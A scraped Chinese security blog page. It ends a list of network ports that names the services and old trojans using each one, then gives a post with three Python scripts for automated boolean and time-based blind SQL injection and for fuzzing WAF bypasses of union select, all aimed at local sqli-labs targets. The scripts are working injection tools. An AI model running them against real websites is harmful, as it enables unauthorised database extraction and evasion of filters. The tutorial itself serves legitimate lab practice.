class="line">1396端口：DVL活跃邮件端口</span><br><span class="line">1397端口：音频活跃邮件端口</span><br><span class="line">1398端口：视频活跃邮件端口</span><br><span class="line">1399端口：Cadkey许可证管理端口</span><br><span class="line">1433端口：Microsoft的SQL服务开放端口</span><br><span class="line">1434端口：Microsoft的SQL服务监视端口</span><br><span class="line">1492端口：木马FTP99CMP开放此端口</span><br><span class="line">1509端口：木马Psyber Streaming Server开放此端口</span><br><span class="line">1512端口：Microsoft Windows网络名称服务</span><br><span class="line">1524端口：许多攻击脚本安装一个后门SHELL于这个端口</span><br><span class="line">1600端口：木马Shivka-Burka开放此端口</span><br><span class="line">1645端口：远程认证拨号用户服务</span><br><span class="line">1701端口：第2层隧道协议</span><br><span class="line">1731端口：NetMeeting音频调用控制</span><br><span class="line">1801端口：Microsoft消息队列服务器</span><br><span class="line">1807端口：木马SpySender开放此端口</span><br><span class="line">1900端口：可被利用ddos攻击，一般关闭</span><br><span class="line">1912端口：金山词霸开放此端口</span><br><span class="line">1981端口：木马ShockRave开放此端口</span><br><span class="line">1999端口：木马BackDoor,yai开放此端口</span><br><span class="line">2000端口：木马GirlFriend 1.3、Millenium 1.0开放此端口</span><br><span class="line">2001端口：木马Millenium 1.0、Trojan Cow,黑洞2001开放此端口</span><br><span class="line">2003端口：GNU 查询</span><br><span class="line">2023端口：木马Pass Ripper开放此端口</span><br><span class="line">2049端口：NFS程序常运行于此端口</span><br><span class="line">2115端口：木马Bugs开放此端口</span><br><span class="line">2140端口：木马Deep Throat 1.0/3.0，The Invasor开放此端口</span><br><span class="line">2500端口：应用固定端口会话复制的RPC客户</span><br><span class="line">2504端口：网络平衡负荷</span><br><span class="line">2565端口：木马Striker开放此端口</span><br><span class="line">2583端口：木马Wincrash 2.0开放此端口</span><br><span class="line">2801端口：木马Phineas Phucker开放此端口</span><br><span class="line">2847端口：诺顿反病毒服务开放此端口</span><br><span class="line">3024端口：木马WinCrash开放此端口</span><br><span class="line">3128端口：squid http代理服务器开放此端口</span><br><span class="line">3129端口：木马Master Paradise开放此端口</span><br><span class="line">3150端口：木马The Invasor,deep throat开放此端口</span><br><span class="line">3210端口：木马SchoolBus开放此端口</span><br><span class="line">3306端口：MySQL开放此端口</span><br><span class="line">3333端口：木马Prosiak开放此端口</span><br><span class="line">3389端口：WINDOWS 2000终端开放此端口</span><br><span class="line">3456端口：inetinfo.exe(互联网信息服务)开放端口，VAT默认数据</span><br><span class="line">3457端口：VAT默认控制</span><br><span class="line">3527端口：Microsoft消息队列服务器</span><br><span class="line">3700端口：木马Portal of Doom开放此端口</span><br><span class="line">3996端口：木马RemoteAnything开放此端口</span><br><span class="line">4000端口：腾讯QQ客户端开放此端口</span><br><span class="line">4060端口：木马RemoteAnything开放此端口</span><br><span class="line">4092端口：木马WinCrash开放此端口</span><br><span class="line">4133端口：NUTS Bootp服务器</span><br><span class="line">4134端口：NIFTY-Serve HMI协议</span><br><span class="line">4141端口：Workflow服务器</span><br><span class="line">4142端口：文档服务器</span><br><span class="line">4143端口：文档复制</span><br><span class="line">4145端口：VVR控制</span><br><span class="line">4321端口：远程Who Is查询</span><br><span class="line">4333端口：微型sql服务器</span><br><span class="line">4349端口：文件系统端口记录</span><br><span class="line">4350端口：网络设备</span><br><span class="line">4351端口：PLCY网络服务</span><br><span class="line">4453端口：NSS警报管理</span><br><span class="line">4454端口：NSS代理管理</span><br><span class="line">4455端口：PR聊天用户</span><br><span class="line">4456端口：PR聊天服务器</span><br><span class="line">4457端口：PR注册</span><br><span class="line">4480端口：Proxy+ HTTP代理端口</span><br><span class="line">4500端口：Lsass开放端口，不能关闭</span><br><span class="line">4547端口：Lanner许可管理</span><br><span class="line">4555端口：RSIP端口</span><br><span class="line">4590端口：木马ICQTrojan开放此端口</span><br><span class="line">4672端口：远程文件访问服务器</span><br><span class="line">4752端口：简单网络音频服务器</span><br><span class="line">4800端口：Icona快速消息系统</span><br><span class="line">4801端口：Icona网络聊天</span><br><span class="line">4802端口：Icona许可系统服务器</span><br><span class="line">4848端口：App服务器-Admin HTTP</span><br><span class="line">4849端口：App服务器-Admin HTTPS</span><br><span class="line">4950端口：木马IcqTrojan开放5000端口</span><br><span class="line">5000端口：木马blazer5，Sockets de Troie开放5000端口，一般应关闭</span><br><span class="line">5001端口：木马Sockets de Troie开放5001端口</span><br><span class="line">5006端口：wsm服务器</span><br><span class="line">5007端口：wsm服务器ssl</span><br><span class="line">5022端口：mice服务器</span><br><span class="line">5050端口：多媒体会议控制协议</span><br><span class="line">5051端口：ITA代理</span><br><span class="line">5052端口：ITA管理</span><br><span class="line">5137端口：MyCTS服务器端口</span><br><span class="line">5150端口：Ascend通道管理协议</span><br><span class="line">5154端口：BZFlag游戏服务器</span><br><span class="line">5190端口：America-Online(美国在线)</span><br><span class="line">5191端口：AmericaOnline1(美国在线)</span><br><span class="line">5192端口：AmericaOnline2(美国在线)</span><br><span class="line">5193端口：AmericaOnline3(美国在线)</span><br><span class="line">5222端口：Jabber客户端连接</span><br><span class="line">5225端口：HP(惠普公司)服务器</span><br><span class="line">5226端口：HP(惠普公司)</span><br><span class="line">5232端口：SGI绘图软件端口</span><br><span class="line">5250端口：i网关</span><br><span class="line">5264端口：3Com网络端口1</span><br><span class="line">5265端口：3Com网络端口2</span><br><span class="line">5269端口：Jabber服务器连接</span><br><span class="line">5306端口：Sun MC组</span><br><span class="line">5321端口：木马Sockets de Troie开放5321端口</span><br><span class="line">5400端口：木马Blade Runner开放此端口</span><br><span class="line">5401端口：木马Blade Runner开放此端口</span><br><span class="line">5402端口：木马Blade Runner开放此端口</span><br><span class="line">5405端口：网络支持</span><br><span class="line">5409端口：Salient数据服务器</span><br><span class="line">5410端口：Salient用户管理</span><br><span class="line">5415端口：NS服务器</span><br><span class="line">5416端口：SNS网关</span><br><span class="line">5417端口：SNS代理</span><br><span class="line">5421端口：网络支持2</span><br><span class="line">5423端口：虚拟用户</span><br><span class="line">5427端口：SCO-PEER-TTA(Unix系统)</span><br><span class="line">5432端口：PostgreSQL数据库</span><br><span class="line">5550端口：木马xtcp开放此端口</span><br><span class="line">5569端口：木马Robo-Hack开放此端口</span><br><span class="line">5599端口：公司远程安全安装</span><br><span class="line">5600端口：公司安全管理</span><br><span class="line">5601端口：公司安全代理</span><br><span class="line">5631端口：pcANYWHERE(软件)数据</span><br><span class="line">5632端口：pcANYWHERE(软件)数据</span><br><span class="line">5673端口：JACL消息服务器</span><br><span class="line">5675端口：V5UA应用端口</span><br><span class="line">5676端口：RA管理</span><br><span class="line">5678端口：远程复制代理连接</span><br><span class="line">5679端口：直接电缆连接</span><br><span class="line">5720端口：MS-执照</span><br><span class="line">5729端口：Openmail用户代理层</span><br><span class="line">5730端口：Steltor&apos;s日历访问</span><br><span class="line">5731端口：netscape(网景)suiteware</span><br><span class="line">5732端口：netscape(网景)suiteware</span><br><span class="line">5742端口：木马WinCrash1.03开放此端口</span><br><span class="line">5745端口：fcopy-服务器</span><br><span class="line">5746端口：fcopys-服务器</span><br><span class="line">5755端口：OpenMail(邮件服务器)桌面网关服务器</span><br><span class="line">5757端口：OpenMail(邮件服务器)X.500目录服务器</span><br><span class="line">5766端口：OpenMail (邮件服务器)NewMail服务器</span><br><span class="line">5767端口：OpenMail (邮件服务器)请求代理曾(安全)</span><br><span class="line">5768端口：OpenMail(邮件服务器) CMTS服务器</span><br><span class="line">5777端口：DALI端口</span><br><span class="line">5800端口：虚拟网络计算</span><br><span class="line">5801端口：虚拟网络计算</span><br><span class="line">5802端口：虚拟网络计算HTTP访问, d</span><br><span class="line">5803端口：虚拟网络计算HTTP访问, d</span><br><span class="line">5900端口：虚拟网络计算机显示0</span><br><span class="line">5901端口：虚拟网络计算机显示1</span><br><span class="line">5902端口：虚拟网络计算机显示2</span><br><span class="line">5903端口：虚拟网络计算机显示3</span><br><span class="line">6000端口：X Window 系统</span><br><span class="line">6001端口：X Window 服务器</span><br><span class="line">6002端口：X Window 服务器</span><br><span class="line">6003端口：X Window 服务器</span><br><span class="line">6004端口：X Window 服务器</span><br><span class="line">6005端口：X Window 服务器</span><br><span class="line">6006端口：X Window 服务器</span><br><span class="line">6007端口：X Window 服务器</span><br><span class="line">6008端口：X Window 服务器</span><br><span class="line">6009端口：X Window 服务器</span><br><span class="line">6456端口：SKIP证书发送</span><br><span class="line">6471端口：LVision许可管理器</span><br><span class="line">6505端口：BoKS管理私人端口</span><br><span class="line">6506端口：BoKS管理公共端口</span><br><span class="line">6507端口：BoKS Dir服务器,私人端口</span><br><span class="line">6508端口：BoKS Dir服务器,公共端口</span><br><span class="line">6509端口：MGCS-MFP端口</span><br><span class="line">6510端口：MCER端口</span><br><span class="line">6566端口：SANE控制端口</span><br><span class="line">6580端口：Parsec主服务器</span><br><span class="line">6581端口：Parsec对等网络</span><br><span class="line">6582端口：Parsec游戏服务器</span><br><span class="line">6588端口：AnalogX HTTP代理端口</span><br><span class="line">6631端口：Mitchell电信主机</span><br><span class="line">6667端口：Internet多线交谈</span><br><span class="line">6668端口：Internet多线交谈</span><br><span class="line">6670端口：木马Deep Throat开放此端口</span><br><span class="line">6671端口：木马Deep Throat 3.0开放此端口</span><br><span class="line">6699端口：Napster文件(MP3)共享服务</span><br><span class="line">6701端口：KTI/ICAD名称服务器</span><br><span class="line">6788端口：SMC软件-HTTP</span><br><span class="line">6789端口：SMC软件-HTTPS</span><br><span class="line">6841端口：Netmo软件默认开放端口</span><br><span class="line">6842端口：Netmo HTTP服务</span><br><span class="line">6883端口：木马DeltaSource开放此端口</span><br><span class="line">6939端口：木马Indoctrination开放此端口</span><br><span class="line">6969端口：木马Gatecrasher、Priority开放此端口</span><br><span class="line">6970端口：real音频开放此端口</span><br><span class="line">7000端口：木马Remote Grab开放此端口</span><br><span class="line">7002端口：使用者&amp; 组 数据库</span><br><span class="line">7003端口：音量定位数据库</span><br><span class="line">7004端口：AFS/Kerberos认证服务</span><br><span class="line">7005端口：音量管理服务</span><br><span class="line">7006端口：错误解释服务</span><br><span class="line">7007端口：Basic监督进程</span><br><span class="line">7008端口：服务器-服务器更新程序</span><br><span class="line">7009端口：远程缓存管理服务</span><br><span class="line">7011端口：Talon软件发现端口</span><br><span class="line">7012端口：Talon软件引擎</span><br><span class="line">7013端口：Microtalon发现</span><br><span class="line">7014端口：Microtalon通信</span><br><span class="line">7015端口：Talon网络服务器</span><br><span class="line">7020端口：DP服务</span><br><span class="line">7021端口：DP服务管理</span><br><span class="line">7100端口：X字型服务</span><br><span class="line">7121端口：虚拟原型许可证管理</span><br><span class="line">7300端口：木马NetMonitor开放此端口</span><br><span class="line">7301端口：木马NetMonitor开放此端口</span><br><span class="line">7306端口：木马NetMonitor，NetSpy1.0开放此端口</span><br><span class="line">7307端口：木马NetMonitor开放此端口</span><br><span class="line">7308端口：木马NetMonitor开放此端口</span><br><span class="line">7323端口：Sygate服务器端</span><br><span class="line">7511端口：木马聪明基因开放此端口</span><br><span class="line">7588端口：Sun许可证管理</span><br><span class="line">7597端口：木马Quaz开放此端口</span><br><span class="line">7626端口：木马冰河开放此端口</span><br><span class="line">7633端口：PMDF管理</span><br><span class="line">7674端口：iMQ SSL通道</span><br><span class="line">7675端口：iMQ通道</span><br><span class="line">7676端口：木马Giscier开放此端口</span><br><span class="line">7720端口：Med图象入口</span><br><span class="line">7743端口：Sakura脚本传递协议</span><br><span class="line">7789端口：木马ICKiller开放此端口</span><br><span class="line">7797端口：Propel连接器端口</span><br><span class="line">7798端口：Propel编码器端口</span><br><span class="line">8000端口：腾讯QQ服务器端开放此端口</span><br><span class="line">8001端口：VCOM通道</span><br><span class="line">8007端口：Apache(类似iis)jServ协议1.x</span><br><span class="line">8008端口：HTTP Alternate</span><br><span class="line">8009端口：Apache(类似iis)JServ协议1.3</span><br><span class="line">8010端口：Wingate代理开放此端口</span><br><span class="line">8011端口：木马way2.4开放此端口</span><br><span class="line">8022端口：OA-系统</span><br><span class="line">8080端口：WWW代理开放此端口</span><br><span class="line">8081端口：ICECap控制台</span><br><span class="line">8082端口：BlackIce(防止黑客软件)警报发送到此端口</span><br><span class="line">8118端口：Privoxy HTTP代理</span><br><span class="line">8121端口：Apollo数据端口</span><br><span class="line">8122端口：Apollo软件管理端口</span><br><span class="line">8181端口：Imail</span><br><span class="line">8225端口：木马灰鸽子开放此端口</span><br><span class="line">8311端口：木马初恋情人开放此端口</span><br><span class="line">8351端口：服务器寻找</span><br><span class="line">8416端口：eSpeech Session协议</span><br><span class="line">8417端口：eSpeech RTP协议</span><br><span class="line">8473端口：虚拟点对点</span><br><span class="line">8668端口：网络地址转换</span><br><span class="line">8786端口：Message客户端</span><br><span class="line">8787端口：Message服务器</span><br><span class="line">8954端口：Cumulus管理端口</span><br><span class="line">9000端口：CS监听</span><br><span class="line">9001端口：ETL服务管理</span><br><span class="line">9002端口：动态id验证</span><br><span class="line">9021端口：Pangolin验证</span><br><span class="line">9022端口：PrivateArk远程代理</span><br><span class="line">9023端口：安全网络登陆-1</span><br><span class="line">9024端口：安全网络登陆-2</span><br><span class="line">9025端口：安全网络登陆-3</span><br><span class="line">9026端口：安全网络登陆-4</span><br><span class="line">9101端口：Bacula控制器</span><br><span class="line">9102端口：Bacula文件后台</span><br><span class="line">9103端口：Bacula存储邮件后台</span><br><span class="line">9111端口：DragonIDS控制台</span><br><span class="line">9217端口：FSC通讯端口</span><br><span class="line">9281端口：软件传送端口1</span><br><span class="line">9282端口：软件传送端口2</span><br><span class="line">9346端口：C技术监听</span><br><span class="line">9400端口：木马Incommand 1.0开放此端口</span><br><span class="line">9401端口：木马Incommand 1.0开放此端口</span><br><span class="line">9402端口：木马Incommand 1.0开放此端口</span><br><span class="line">9594端口：信息系统</span><br><span class="line">9595端口：Ping Discovery服务</span><br><span class="line">9800端口：WebDav源端口</span><br><span class="line">9801端口：Sakura脚本转移协议-2</span><br><span class="line">9802端口：WebDAV Source TLS/SSL</span><br><span class="line">9872端口：木马Portal of Doom开放此端口</span><br><span class="line">9873端口：木马Portal of Doom开放此端口</span><br><span class="line">9874端口：木马Portal of Doom开放此端口</span><br><span class="line">9875端口：木马Portal of Doom开放此端口</span><br><span class="line">9899端口：木马InIkiller开放此端口</span><br><span class="line">9909端口：域名时间</span><br><span class="line">9911端口：SYPECom传送协议</span><br><span class="line">9989端口：木马iNi-Killer开放此端口</span><br><span class="line">9990端口：OSM Applet程序服务器</span><br><span class="line">9991端口：OSM事件服务器</span><br><span class="line">10000端口：网络数据管理协议</span><br><span class="line">10001端口：SCP构造端口</span><br><span class="line">10005端口：安全远程登陆</span><br><span class="line">10008端口：Octopus多路器</span><br><span class="line">10067端口：木马iNi-Killer开放此端口</span><br><span class="line">10113端口：NetIQ端点</span><br><span class="line">10115端口：NetIQ端点</span><br><span class="line">10116端口：NetIQVoIP鉴定器</span><br><span class="line">10167端口：木马iNi-Killer开放此端口</span><br><span class="line">11000端口：木马SennaSpy开放此端口</span><br><span class="line">11113端口：金山词霸开放此端口</span><br><span class="line">11233端口：木马Progenic trojan开放此端口</span><br><span class="line">12076端口：木马Telecommando开放此端口</span><br><span class="line">12223端口：木马Hack&apos;99 KeyLogger开放此端口</span><br><span class="line">12345端口：木马NetBus1.60/1.70、GabanBus开放此端口</span><br><span class="line">12346端口：木马NetBus1.60/1.70、GabanBus开放此端口</span><br><span class="line">12361端口：木马Whack-a-mole开放此端口</span><br><span class="line">13223端口：PowWow 客户端，是Tribal Voice的聊天程序</span><br><span class="line">13224端口：PowWow 服务器，是Tribal Voice的聊天程序</span><br><span class="line">16959端口：木马Subseven开放此端口</span><br><span class="line">16969端口：木马Priority开放此端口</span><br><span class="line">17027端口：外向连接</span><br><span class="line">19191端口：木马蓝色火焰开放此端口</span><br><span class="line">20000端口：木马Millennium开放此端口</span><br><span class="line">20001端口：木马Millennium开放此端口</span><br><span class="line">20034端口：木马NetBus Pro开放此端口</span><br><span class="line">21554端口：木马GirlFriend开放此端口</span><br><span class="line">22222端口：木马Prosiak开放此端口</span><br><span class="line">23444端口：木马网络公牛开放此端口</span><br><span class="line">23456端口：木马Evil FTP、Ugly FTP开放此端口</span><br><span class="line">25793端口：Vocaltec地址服务器</span><br><span class="line">26262端口：K3软件-服务器</span><br><span class="line">26263端口：K3软件客户端</span><br><span class="line">26274端口：木马Delta开放此端口</span><br><span class="line">27374端口：木马Subseven 2.1开放此端口</span><br><span class="line">30100端口：木马NetSphere开放此端口</span><br><span class="line">30129端口：木马Masters Paradise开放此端口</span><br><span class="line">30303端口：木马Socket23开放此端口</span><br><span class="line">30999端口：木马Kuang开放此端口</span><br><span class="line">31337端口：木马BO(Back Orifice)开放此端口</span><br><span class="line">31338端口：木马BO(Back Orifice)，DeepBO开放此端口</span><br><span class="line">31339端口：木马NetSpy DK开放此端口</span><br><span class="line">31666端口：木马BOWhack开放此端口</span><br><span class="line">31789端口：Hack-a-tack</span><br><span class="line">32770端口：sun solaris RPC服务开放此端口</span><br><span class="line">33333端口：木马Prosiak开放此端口</span><br><span class="line">33434端口：路由跟踪</span><br><span class="line">34324端口：木马Tiny Telnet Server、BigGluck、TN开放此端口</span><br><span class="line">36865端口：KastenX软件端口</span><br><span class="line">38201端口：Galaxy7软件数据通道</span><br><span class="line">39681端口：TurboNote默认端口</span><br><span class="line">40412端口：木马The Spy开放此端口</span><br><span class="line">40421端口：木马Masters Paradise开放此端口</span><br><span class="line">40422端口：木马Masters Paradise开放此端口</span><br><span class="line">40423端口：木马Masters Paradise开放此端口</span><br><span class="line">40426端口：木马Masters Paradise开放此端口</span><br><span class="line">40843端口：CSCC 防火墙</span><br><span class="line">43210端口：木马SchoolBus 1.0/2.0开放此端口</span><br><span class="line">43190端口：IP-PROVISION</span><br><span class="line">44321端口：PCP服务器(pmcd)</span><br><span class="line">44322端口：PCP服务器(pmcd)代理</span><br><span class="line">44334端口：微型个人防火墙端口</span><br><span class="line">44442端口：ColdFusion软件端口</span><br><span class="line">44443端口：ColdFusion软件端口</span><br><span class="line">44445端口：木马Happypig开放此端口</span><br><span class="line">45576端口：E代时光专业代理开放此端口</span><br><span class="line">47262端口：木马Delta开放此端口</span><br><span class="line">47624端口：Direct Play服务器</span><br><span class="line">47806端口：ALC协议</span><br><span class="line">48003端口：Nimbus网关</span><br><span class="line">50505端口：木马Sockets de Troie开放此端口</span><br><span class="line">50766端口：木马Fore开放此端口</span><br><span class="line">53001端口：木马Remote Windows Shutdown开放此端口</span><br><span class="line">54320端口：木马bo2000开放此端口</span><br><span class="line">54321端口：木马SchoolBus 1.0/2.0开放此端口</span><br><span class="line">61466端口：木马Telecommando开放此端口</span><br><span class="line">65000端口：木马Devil 1.03开放此端口</span><br><span class="line">65301端口：PC Anywhere软件开放端口</span><br></pre></td></tr></table></figure>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/22/python脚本实现自动化sql盲注/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="麻薯">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/uploads/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Leticia's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2018/04/22/python脚本实现自动化sql盲注/" itemprop="url">
                  python脚本实现自动化sql盲注
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-04-22T22:59:37+08:00">
                2018-04-22
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
                    <span itemprop="name">渗透测试</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          
             <span id="/2018/04/22/python脚本实现自动化sql盲注/" class="leancloud_visitors" data-flag-title="python脚本实现自动化sql盲注">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数 </span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          
            <div class="post-wordcount">
              

              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长</span>
                
                <span title="阅读时长">
                  
                </span>
              
            </div>
          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>前面几篇博客写了sql注入时的绕过方法和盲注时经常使用的函数，但是我们明显能看到一个问题，那就是盲注时候需要对比每个字符的ascii码，如果手工注入就会十分浪费时间，所以我们这次尝试用python实现自动话注入。</p>
<h2 id="0x01-布尔型盲注"><a href="#0x01-布尔型盲注" class="headerlink" title="0x01 布尔型盲注"></a>0x01 布尔型盲注</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#! -*- encoding:utf-8 -*-</span><br><span class="line"># python3</span><br><span class="line"># author: leticia</span><br><span class="line">import requests</span><br><span class="line">#用这里的语句分别替换id中的内容即可爆库、表、字段</span><br><span class="line">#select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA</span><br><span class="line">#select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA = &apos;xxx&apos;</span><br><span class="line">#select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_SCHEMA = &apos;xxx&apos; and TABLE_NAME = &apos;xxx&apos;</span><br><span class="line">dic=&apos;0123456789abcdefghijklmnopqrstuvwxyz,&apos;</span><br><span class="line">url=&apos;http://127.0.0.1/sqli-labs/Less-8/?id=1\&apos; and &apos;</span><br><span class="line">string=&apos;&apos;</span><br><span class="line">for i in range(1,100):</span><br><span class="line">    for j in dic:</span><br><span class="line">        id=&quot;substr((select group_concat(schema_name) from information_schema.schemata limit 0,1),&#123;0&#125;,1)=&#123;1&#125;--+&quot;.format(str(i),ascii(j))</span><br><span class="line">        #print(id)</span><br><span class="line">        url_get=(url+id)</span><br><span class="line">        #print(url_get)</span><br><span class="line">        r=requests.get(url_get)</span><br><span class="line">        if &quot;You&quot; in r.text:</span><br><span class="line">            string+=j</span><br><span class="line">            print(string)</span><br><span class="line">print(string)</span><br></pre></td></tr></table></figure>
<p>这里我们可以通过构造id的值，循环遍历库名集合的前100个位置与dic中的所有字符进行比对，然后如果返回页面正常即存在user关键字（根据实际情况更改），就将这个字母保存在string中，遍历完之后输出string。</p>
<h2 id="0x02-基于时间的盲注"><a href="#0x02-基于时间的盲注" class="headerlink" title="0x02 基于时间的盲注"></a>0x02 基于时间的盲注</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#! -*- encoding:utf-8 -*-</span><br><span class="line"># python3</span><br><span class="line"># author: leticia</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">#用这里的语句分别替换id中的内容即可爆库、表、字段</span><br><span class="line">#select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA</span><br><span class="line">#select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA = &apos;xxx&apos;</span><br><span class="line">#select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_SCHEMA = &apos;xxx&apos; and TABLE_NAME = &apos;xxx&apos;</span><br><span class="line">dic=&apos;0123456789abcdefghijklmnopqrstuvwxyz,&apos;</span><br><span class="line">url=&apos;http://127.0.0.1/sqli-labs/Less-8/?id=1\&apos; and &apos;</span><br><span class="line">string=&apos;&apos;</span><br><span class="line">for i in range(100):</span><br><span class="line">    for j in dic:</span><br><span class="line">        id=&quot;if((substr((select group_concat(schema_name) from information_schema.schemata limit 0,1),&#123;0&#125;,1)=&#123;1&#125;),sleep(3),0)--+&quot;.format(str(i),ascii(j))</span><br><span class="line">        #print(id)</span><br><span class="line">        url_get=(url+id)</span><br><span class="line">        #print(url_get)</span><br><span class="line">        r=requests.get(url_get)</span><br><span class="line">        sec=r.elapsed.seconds</span><br><span class="line">        if sec &gt; 2:</span><br><span class="line">            string+=j</span><br><span class="line">            print(string)</span><br><span class="line">            break</span><br><span class="line">print(string)</span><br></pre></td></tr></table></figure>
<p>这里我们可以通过构造id的值，循环遍历库名集合的前100个位置与dic中的所有字符进行比对，然后如果返回页面需要两秒以上才能返回（即触发sleep(3)函数），就将这个字母保存在string中，遍历完之后输出string。</p>
<h2 id="0x03-fuzz测试"><a href="#0x03-fuzz测试" class="headerlink" title="0x03 fuzz测试"></a>0x03 fuzz测试</h2><p>在安全测试中，模糊测试（fuzz testing）是一种介于完全的手工渗透测试与完全的自动化测试之间的安全性测试类型。在某些有安全狗一类的防护系统下，如果要手工判断过滤规则需要安全工作者很高的执行力，在这些情况下fuzz测试可以充分利用机器生成无规则且大量的数据来进行测试，拥有很高的效率。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">#! -*- encoding:utf-8 -*-</span><br><span class="line"># python3</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">fuzz_zs = [&apos;/*&apos;, &apos;*/&apos;, &apos;/*!&apos;, &apos;*&apos;, &apos;=&apos;, &apos;`&apos;, &apos;!&apos;, &apos;@&apos;, &apos;%&apos;, &apos;.&apos;, &apos;-&apos;, &apos;+&apos;, &apos;|&apos;, &apos;%00&apos;]</span><br><span class="line">fuzz_sz = [&apos;&apos;, &apos; &apos;]</span><br><span class="line">fuzz_ch = [&quot;%0a&quot;, &quot;%0b&quot;, &quot;%0c&quot;, &quot;%0d&quot;, &quot;%0e&quot;, &quot;%0f&quot;, &quot;%0g&quot;, &quot;%0h&quot;, &quot;%0i&quot;, &quot;%0j&quot;]</span><br><span class="line"></span><br><span class="line">fuzz = fuzz_zs + fuzz_sz + fuzz_ch</span><br><span class="line">headers = &#123;</span><br><span class="line">    &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.221 Safari/537.36 SE 2.X MetaSr 1.0&quot;,</span><br><span class="line">    &quot;X-Forwarded-For&quot;: &quot;127.0.0.1&quot;</span><br><span class="line">&#125;</span><br><span class="line">url_start = &quot;http://127.0.0.1/waf/test.php?id=1&quot;</span><br><span class="line">test_url=requests.get(url_start,headers=headers)</span><br><span class="line">print(test_url.text)</span><br><span class="line"></span><br><span class="line">for a in fuzz:</span><br><span class="line">    for b in fuzz:</span><br><span class="line">        for c in fuzz:</span><br><span class="line">            for d in fuzz:</span><br><span class="line">                exp = &quot;/*!union&quot; + a + b + c + d + &quot;select*/ 1,2,3&quot;</span><br><span class="line">                url = url_start + exp</span><br><span class="line">                res = requests.get(url=url, headers=headers)</span><br><span class="line">                print(&quot;Now URL:&quot; + url)</span><br><span class="line">                if &quot;user&quot; in res.text:</span><br><span class="line">                    print(&quot;Find Fuzz bypass:&quot; + url)</span><br><span class="line">                    with open(r&quot;C:\Users\Leticia\Desktop\results.txt&quot;, &apos;a&apos;, encoding=&apos;utf-8&apos;) as r:</span><br><span class="line">                        r.write(url + &quot;\n&quot;)</span><br></pre></td></tr></table></figure>
